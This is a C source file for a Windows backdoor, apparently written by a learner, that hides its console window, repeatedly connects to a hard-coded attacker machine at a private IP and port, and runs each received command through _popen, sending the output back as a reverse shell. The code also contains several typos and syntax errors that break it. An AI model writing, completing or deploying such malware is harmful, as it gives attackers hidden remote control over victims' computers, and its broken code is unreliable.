#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p, size){ (void) memset((p), 0, (size) }

//varibale
int sock ;



// =========================================================

void Shell(){
    //variable
    char buffer[1024]; // resive the commend from the server
    char container[1024]; // 
    char total_response[18384];

        while(1){
                jump;
          bzero(buffer,sizeof(buffer));
          bzero(container,sizeof(container));  
          bzero(total_response, sizeof(total_response));
          recv(sock, buffer, sizeof(container),0);

             // q this sign mean we want to close the connection
            if( strcmp("q",buffer,1) == 0){
                closesocket(sock);
                WSACleanup();
                exit(0);
            }
            else{
                   FILE *fp; //point to this specific memory
                   fp = _popen(buffer, "r") //open it as a process /or task 
                    while(fgets(container,sizeof(container),fp) != NULL ){
                        //getting response from the
                            strcat(total_response, container); //we checking if the resone is fit to the sizeof
                     }
                     send(sock, total_response, sizeof(total_response), 0);
                     fclose(fp);
                 }
            }

}

//==========================================================
/* windows main function that going to connact 
to our server (kali machin) */
// API is used to give as the abillity to access to different 
// function that we will use
// way call it WinMain ? every 
//window program include entery point that called WinMain.
    int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hprev, LPSTR lpCmdLine, int nCmdShow){
// hprev = not has reall meaninig , cmdLine contains the cmd arguments such as unicode, 
// ncmdshow its a flag that says wether the main application windows will be minimized or maximized  ..
        HWND stealth;  // minimized our program to be visable as it runs and make the consle not appear
        AllocConsole(); // allocate new consule to the calling process
        stealth = FindWindowA("ConsoleWindowsClass",NULL);
// 0 = hidding the window ( here we hide the console)
        ShowWindow(stealth,0); //specify wther to show to the user are program or not ( we want it to work in the back)

// ===================================================
//the connaction to the server 
    struct sockaddr_in servaddr ;
    struct sockaddr_in ServAddr;
    unsigned short ServPort ; 
    char *ServIP; //pinter to the ip
    WSADATA wsadata;

    ServIP = "192.168.199.130"; // (the ip of the kali)the ip that are lissing to the incaming connation
    ServPort = 50005;  // and the port 

    // WSAStrtup: if the function is not 0 its exit 
        if(WSAStartup(MAKEWORD(2,0),&wsadata) != 0 ){
            exit(1); //exit the program
        }

    sock = socket(AF_INET,SOCK_STREAM, 0);

    memset(&ServAddr, 0, sizeof(ServAddr)); //clear all to be zero (memory set)
    ServAddr.sin_family = AF_INET; //ipv4 connaction
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    ServAddr/sin_port = htons(ServPort);

    //========================================================
    //perfoem the connaction
    start:
    while ( connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0 ){
        Sleep(10);
    }

    Shell();

}